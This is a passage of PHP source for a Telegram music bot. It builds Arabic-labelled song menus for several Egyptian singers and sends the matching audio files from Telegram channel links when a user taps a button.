if($data=="asala11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/375",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/376",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="asala13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/377",
 'caption'=>"➧𝙅??𝙞𝙣 @J_69_L",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker" ){
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني الجوكر 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 سلمي ١','callback_data'=>"elgoker1"],['text'=>' 🎧 سلمي ٢','callback_data'=>"elgoker2"]],
[['text'=>'🎧اختلافنا رحمه','callback_data'=>"elgoker3"],['text'=>' 🎧 الواقع','callback_data'=>"elgoker4"]],
[['text'=>'🎧 فصله','callback_data'=>"elgoker5"],['text'=>'🎧مناسك الالم','callback_data'=>"elgoker6"]],
[['text'=>'🎧 الكبت','callback_data'=>"elgoker7"],['text'=>'🎧 انفصام حاد ١','callback_data'=>"elgoker8"]],
[['text'=>'🎧 انفصام حاد ٢','callback_data'=>"elgoker9"],['text'=>'🎧 كوبايه عصير','callback_data'=>"elgoker10"]],
[['text'=>'🎧 حلم كبير','callback_data'=>"elgoker11"],['text'=>'🎧 فراق صالونات','callback_data'=>"elgoker12"]],
[['text'=>'🎧 عالم تالت ','callback_data'=>"elgoker13"],['text'=>'🎧 عالم رابع','callback_data'=>"elgoker14"]],
[['text'=>'🎧 الوصايا ','callback_data'=>"elgoker15"],['text'=>'🎧 العقد ','callback_data'=>"elgoker16"]],
[['text'=>'🎧 خد فشار','callback_data'=>"elgoker17"],['text'=>'🎧 فرصه تانيه','callback_data'=>"elgoker18"]],
[['text'=>'🎧 دا تقدير','callback_data'=>"elgoker19"],['text'=>'🎧قصيده ','callback_data'=>"elgoker20"]],
[['text'=>'قطه مغمضه 🎧','callback_data'=>"elgoker 21"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}



if($data=="elgoker1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/504",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/505",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/506",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/507",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/508",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/509",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/510",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/511",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/512",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elgoker10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/513",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/514",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/515",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/516",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker14"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/517",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker15"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/518",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker16"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/519",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker17"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/520",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker18"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/521",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker19"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/522",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker20"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/523",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elgoker21"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/524",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني تامر حسني 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 ناسيني ليه','callback_data'=>"hosnyy1"],['text'=>' 🎧 عيش بشوقكك','callback_data'=>"hosnyy2"]],
[['text'=>'🎧 كل سنه وانت طيب','callback_data'=>"hosnyy3"],['text'=>' 🎧ميت وش ','callback_data'=>"hosnyy4"]],
[['text'=>'🎧 الله شاهد','callback_data'=>"hosnyy5"],['text'=>'🎧 حلم سنين','callback_data'=>"hosnyy6"]],
[['text'=>'🎧 عمري ابتدي','callback_data'=>"hosnyy7"],['text'=>'🎧 كفاياك اعذار','callback_data'=>"hosnyy8"]],
[['text'=>'🎧 كل حاجه','callback_data'=>"hosnyy9"],['text'=>'🎧 واخيرا','callback_data'=>"hosnyy10"]],
[['text'=>'🎧 ثمن اختيار','callback_data'=>"hosnyy11"],['text'=>'🎧ورد صناعي','callback_data'=>"hosnyy12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="hosnyy1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/293",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/294",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/295",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/296",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/297",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/298",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/299",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/300",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/301",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hosnyy10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/302",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hosnyy11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/303",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hosnyy12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/304",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh" ){
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني حسن شاكوش 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'بنت الجيران 🎧','callback_data'=>"skosh1"],['text'=>'هنعمل لغبطيطا 🎧','callback_data'=>"skosh2"]],
[['text'=>'عود البطل 🎧','callback_data'=>"skosh3"],['text'=>'عود البنات 🎧','callback_data'=>"skosh4"]],
[['text'=>'شمس المجره 🎧','callback_data'=>"skosh5"],['text'=>'بونبوني ساقط 🎧','callback_data'=>"skosh6"]],
[['text'=>'جيشنا الابيض 🎧','callback_data'=>"skosh7"],['text'=>'انا علي وضعي 🎧','callback_data'=>"skosh8"]],
[['text'=>'يا ابن امك 🎧','callback_data'=>"skosh9"],['text'=>'خربانه انتي 🎧','callback_data'=>"skosh10"]],
[['text'=>'صاحبي دراعي 🎧','callback_data'=>"skosh11"],['text'=>'يا بنت قلبي 🎧','callback_data'=>"skosh12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="skosh1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/280",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/281",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/282",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/283",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/284",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/285",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/286",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/287",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/288",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="skosh10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/289",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skosh11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/290",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="skosh12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/291",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني حماقي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 من البدايه','callback_data'=>"hmaki1"],['text'=>' 🎧 قدام الناس','callback_data'=>"hmaki2"]],
[['text'=>'🎧 يا ستار','callback_data'=>"hmaki3"],['text'=>' 🎧 راسمك في خيالي','callback_data'=>"hmaki4"]],
[['text'=>'🎧 ما بلاش','callback_data'=>"hmaki5"],['text'=>'🎧 واعمل ايه','callback_data'=>"hmaki6"]],
[['text'=>'🎧 واحده واحده','callback_data'=>"hmaki7"],['text'=>'🎧 من قلبي بغني','callback_data'=>"hmaki8"]],
[['text'=>'🎧 قالو عنك','callback_data'=>"hmaki9"],['text'=>'🎧 تعرف بحبك ليه','callback_data'=>"hmaki10"]],
[['text'=>'🎧 ياللي زعلان','callback_data'=>"hmaki11"],['text'=>'🎧 بقيت معاه','callback_data'=>"hmaki12"]],
[['text'=>'🎧 اجمل يوم ','callback_data'=>"hmaki13"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="hmaki1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/536",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/352",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/353",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/354",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/355",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/356",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/357",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/358",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/359",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hmaki10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/360",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/361",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/362",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="hmaki13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/363",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني عنبه 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 هنا القاهره','callback_data'=>"anpa1"],['text'=>' 🎧 حرب القرود','callback_data'=>"anpa2"]],
[['text'=>'🎧العملاق ','callback_data'=>"anpa3"],['text'=>' 🎧 دنيا الموالد','callback_data'=>"anpa4"]],
[['text'=>'🎧 عالم الجريمه','callback_data'=>"anpa5"],['text'=>'🎧 الليله باظت','callback_data'=>"anpa6"]],
[['text'=>'🎧 العين علينا','callback_data'=>"anpa7"],['text'=>'🎧 ظاطت','callback_data'=>"anpa8"]],
[['text'=>'🎧 كينج اللعبه','callback_data'=>"anpa9"],['text'=>'🎧 جينا ترجعو','callback_data'=>"anpa10"]],
[['text'=>'🎧القفاص ','callback_data'=>"anpa11"],['text'=>'🎧 مفيش اصول','callback_data'=>"anpa12"]],
[['text'=>'🎧طيارات ','callback_data'=>"anpa13"],['text'=>'🎧 غشيم','callback_data'=>"anpa14"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="anpa1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/382",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/383",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/384",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/385",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/386",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/387",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/389",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/390",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anpa9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/391",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anpa10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/392",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anpa11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/393",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anpa12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/394",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anpa13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/395",
 'caption'=>"𝙲𝙷 ??. : @J_69_L",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anpa14"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/396",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anoar" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩  قائمه اغاني ابو الانوار 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 عسليه','callback_data'=>"anoar1"],['text'=>' 🎧 مقصوره','callback_data'=>"anoar2"]],
[['text'=>'🎧انجز ','callback_data'=>"anoar3"],['text'=>' 🎧 لول','callback_data'=>"anoar4"]],
[['text'=>'🎧 غلبه','callback_data'=>"anoar5"],['text'=>'🎧 اتغيرنا','callback_data'=>"anoar6"]],
[['text'=>'🎧 صبحي','callback_data'=>"anoar7"],['text'=>'🎧 سكو','callback_data'=>"anoar8"]],
[['text'=>'🎧 بارات','callback_data'=>"anoar9"],['text'=>'🎧البويرتو ','callback_data'=>"anoar10"]],
[['text'=>'🎧 ماشي','callback_data'=>"anoar11"],['text'=>'🎧يمكن ','callback_data'=>"anoar12"]],
[['text'=>'مش ناقص  🎧','callback_data'=>"anoar13"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="anoar1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/527",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/528",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/529",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/530",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/531",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/532",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/533",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/534",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="anoar9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/535",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anoar10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/537",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anoar11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/710",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anoar12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/708",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="anoar13"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/709",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني بيكا 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 هاتلي فوديكا','callback_data'=>"bika1"],['text'=>' 🎧 وداع يا دنيا','callback_data'=>"bika2"]],
[['text'=>'🎧هلا والله ','callback_data'=>"bika3"],['text'=>' 🎧 باتون ساليه','callback_data'=>"bika4"]],
[['text'=>'🎧 انا حبيتك وجرحتيني','callback_data'=>"bika5"],['text'=>'🎧 انا بيكا ماي لاف فانز','callback_data'=>"bika6"]],
[['text'=>'🎧 عالم فاسد','callback_data'=>"bika7"],['text'=>'🎧 رب الكون','callback_data'=>"bika8"]],
[['text'=>'🎧 شارب المرار','callback_data'=>"bika9"],['text'=>'🎧 حب عمري','callback_data'=>"bika10"]],
[['text'=>'🎧 صاحبي دراعي','callback_data'=>"bika11"],['text'=>'🎧 سكينه برازيلي','callback_data'=>"bika12"]],
[['text'=>'🎧بنت ابوها ','callback_data'=>"bika13"],['text'=>'🎧 مساء النقص','callback_data'=>"bika14"]],
[['text'=>'بنتخان 🎧','callback_data'=>"bika15"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="bika1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/307",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/308",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/309",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/310",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

